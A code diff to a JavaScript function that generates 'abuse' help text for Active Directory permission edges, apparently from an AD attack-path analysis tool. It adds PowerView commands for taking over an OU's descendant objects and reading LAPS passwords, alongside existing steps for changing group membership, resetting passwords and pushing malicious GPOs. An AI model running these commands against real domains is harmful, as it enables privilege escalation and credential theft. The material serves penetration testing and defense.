@@ -1,4 +1,4 @@
-const Abuse = (sourceName, sourceType, targetName, targetType) => {
+const Abuse = (sourceName, sourceType, targetName, targetType, targetId) => {
     let text = ``;
     if (targetType === 'Group') {
         text = `Full control of a group allows you to directly modify group membership of the group. 
@@ -12,7 +12,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         }. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
         <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
 
         Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ${sourceName}:
 
@@ -34,7 +34,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         }. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
         <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
 
         Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ${sourceName}:
 
@@ -58,7 +58,7 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
         }. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
         <code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)</code>
+        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)</code>
 
         Then create a secure string object for the password you want to set on the target user:
 
@@ -140,7 +140,46 @@ const Abuse = (sourceName, sourceType, targetName, targetType) => {
     } else if (targetType === 'GPO') {
         text = `With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse`;
     } else if (targetType === 'OU') {
-        //TODO: Add This
+        text = `<h4>Control of the Organization Unit</h4>
+        
+        With full control of the OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:
+
+        <h4>Generic Descendent Object Takeover</h4>
+        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU.
+
+        First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU ${targetName} is: ${targetId}.
+        
+        Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':
+        
+        <code>$Guids = Get-DomainGUIDMap
+        $AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name</code>
+        
+        Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:
+        
+        <code>$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid</code>
+        
+        Finally, we will apply this ACE to our target OU:
+        
+        <code>$OU = Get-DomainOU -Raw (OU GUID)
+        $DsEntry = $OU.GetDirectoryEntry()
+        $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
+        $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
+        $dsEntry.PsBase.CommitChanges()</code>
+        
+        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
+        
+        <h4>Targeted Descendent Object Takeoever</h4>
+        If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:
+        
+        <code>$Guids = Get-DomainGUIDMap
+        $AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
+        $CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
+        $ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
+        $OU = Get-DomainOU -Raw Workstations
+        $DsEntry = $OU.GetDirectoryEntry()
+        $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
+        $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
+        $dsEntry.PsBase.CommitChanges()</code>`;
     }
     return { __html: text };
 };
